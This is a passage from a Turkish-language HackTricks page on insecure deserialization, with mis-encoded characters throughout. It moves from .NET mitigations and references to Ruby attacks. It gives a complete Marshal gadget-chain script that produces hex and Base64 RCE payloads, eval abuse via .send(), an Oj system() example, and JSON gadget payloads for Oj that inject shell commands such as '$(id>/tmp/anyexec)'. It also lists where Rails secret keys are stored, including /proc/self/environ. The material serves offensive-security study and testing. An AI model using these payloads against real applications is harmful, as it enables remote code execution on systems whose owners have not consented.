* **.Net iÃ§indeki bilinen gÃ¼vensiz deserialization aletleri hakkÄ±nda bilgi sahibi olun** ve deserializer'larÄ±n bu tÃ¼rleri Ã¶rneklemediÄŸinden emin olun.
* **Potansiyel olarak riskli kodu** internet eriÅŸimi olan koddan izole edin, bÃ¶ylece `System.Windows.Data.ObjectDataProvider` gibi bilinen aletleri gÃ¼vensiz veri kaynaklarÄ±na maruz bÄ±rakmaktan kaÃ§Ä±nÄ±n.

### **Referanslar**

* Java ve .Net JSON deserialization **belgesi:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** konuÅŸma: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) ve slaytlar: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Ruby'de, serialization **marshal** kÃ¼tÃ¼phanesindeki iki yÃ¶ntemle saÄŸlanÄ±r. Ä°lk yÃ¶ntem, **dump** olarak bilinir ve bir nesneyi bir byte akÄ±ÅŸÄ±na dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in kullanÄ±lÄ±r. Bu iÅŸleme serialization denir. Tersine, ikinci yÃ¶ntem **load** olarak adlandÄ±rÄ±lÄ±r ve bir byte akÄ±ÅŸÄ±nÄ± tekrar bir nesneye dÃ¶ndÃ¼rmek iÃ§in kullanÄ±lÄ±r; bu iÅŸleme ise deserialization denir.

SerileÅŸtirilmiÅŸ nesneleri gÃ¼vence altÄ±na almak iÃ§in, **Ruby HMAC (Hash-Based Message Authentication Code)** kullanÄ±r ve verilerin bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ ve doÄŸruluÄŸunu saÄŸlar. Bu amaÃ§la kullanÄ±lan anahtar, birkaÃ§ olasÄ± konumdan birinde saklanÄ±r:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**Ruby 2.X genel deserialization'dan RCE alet zincirine (daha fazla bilgi iÃ§in** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
DiÄŸer RCE zinciri Ruby On Rails'i istismar etmek iÃ§in: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() metodu

[**bu gÃ¼venlik aÃ§Ä±ÄŸÄ± raporunda**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/) aÃ§Ä±klandÄ±ÄŸÄ± gibi, bazÄ± kullanÄ±cÄ±larÄ±n temizlenmemiÅŸ giriÅŸi bir ruby nesnesinin `.send()` metoduna ulaÅŸÄ±rsa, bu metod nesnenin **herhangi bir diÄŸer metodunu** herhangi bir parametre ile Ã§aÄŸÄ±rmaya izin verir.

Ã–rneÄŸin, eval Ã§aÄŸÄ±rmak ve ardÄ±ndan ruby kodunu ikinci parametre olarak vermek, rastgele kodu Ã§alÄ±ÅŸtÄ±rmaya olanak tanÄ±r:

{% code overflow="wrap" %}
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
{% endcode %}

AyrÄ±ca, yalnÄ±zca **`.send()`** yÃ¶nteminin bir parametresi bir saldÄ±rgan tarafÄ±ndan kontrol ediliyorsa, Ã¶nceki yazÄ±da belirtildiÄŸi gibi, **argÃ¼man gerektirmeyen** veya argÃ¼manlarÄ±nÄ±n **varsayÄ±lan deÄŸerleri** olan herhangi bir nesne yÃ¶ntemini Ã§aÄŸÄ±rmak mÃ¼mkÃ¼ndÃ¼r.\
Bunun iÃ§in, bu gereksinimleri karÅŸÄ±layan **ilginÃ§ yÃ¶ntemleri bulmak Ã¼zere nesnenin tÃ¼m yÃ¶ntemlerini listelemek** mÃ¼mkÃ¼ndÃ¼r.

{% code overflow="wrap" %}
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
{% endcode %}

### DiÄŸer kÃ¼tÃ¼phaneler

Bu teknik [**bu blog yazÄ±sÄ±ndan**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm\_source=pocket\_shared) alÄ±nmÄ±ÅŸtÄ±r.

RCE elde etmek iÃ§in kÃ¶tÃ¼ye kullanÄ±labilecek nesneleri serileÅŸtirmek iÃ§in kullanÄ±labilecek baÅŸka Ruby kÃ¼tÃ¼phaneleri vardÄ±r. AÅŸaÄŸÄ±daki tablo, bu kÃ¼tÃ¼phanelerden bazÄ±larÄ±nÄ± ve yÃ¼klenen kÃ¼tÃ¼phanenin serileÅŸtirilmediÄŸinde Ã§aÄŸÄ±rdÄ±ÄŸÄ± yÃ¶ntemi gÃ¶stermektedir (temelde RCE elde etmek iÃ§in kÃ¶tÃ¼ye kullanÄ±lacak fonksiyon):

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>KÃ¼tÃ¼phane</strong></td><td><strong>Girdi verisi</strong></td><td><strong>SÄ±nÄ±f iÃ§indeki baÅŸlatma yÃ¶ntemi</strong></td></tr><tr><td>Marshal (Ruby)</td><td>Ä°kili</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (sÄ±nÄ±fÄ±n hash(maps) iÃ§inde anahtar olarak yer almasÄ± gerekir)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (sÄ±nÄ±fÄ±n hash(maps) iÃ§inde anahtar olarak yer almasÄ± gerekir)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (sÄ±nÄ±fÄ±n hash(maps) iÃ§inde anahtar olarak yer almasÄ± gerekir)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([json_create ile ilgili notlara bakÄ±n](#table-vulnerable-sinks) son)</td></tr></tbody></table>

Temel Ã¶rnek:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
Oj'yi kÃ¶tÃ¼ye kullanmaya Ã§alÄ±ÅŸÄ±rken, `hash` fonksiyonu iÃ§inde `to_s` Ã§aÄŸrÄ±sÄ± yapan bir gadget sÄ±nÄ±fÄ± bulmak mÃ¼mkÃ¼n oldu. Bu, spec'i Ã§aÄŸÄ±racak ve fetch\_path'Ä± Ã§aÄŸÄ±racak ÅŸekildeydi; bu da rastgele bir URL almasÄ±nÄ± saÄŸladÄ± ve bu tÃ¼r sanitasyonsuz deserialization zafiyetlerinin harika bir dedektÃ¶rÃ¼nÃ¼ saÄŸladÄ±.
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport","path": "/", "user": "anyuser", "password": "anypw"
}
```
AyrÄ±ca, Ã¶nceki teknikle sistemde bir klasÃ¶rÃ¼n de oluÅŸturulduÄŸu, bunun baÅŸka bir gadget'Ä± istismar etmek iÃ§in bir gereklilik olduÄŸu ve bunu ÅŸu ÅŸekilde tam bir RCE'ye dÃ¶nÃ¼ÅŸtÃ¼rdÃ¼ÄŸÃ¼ bulundu:
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
Daha fazla detay iÃ§in [**orijinal gÃ¶nderiye**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm\_source=pocket\_shared) bakÄ±n.

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
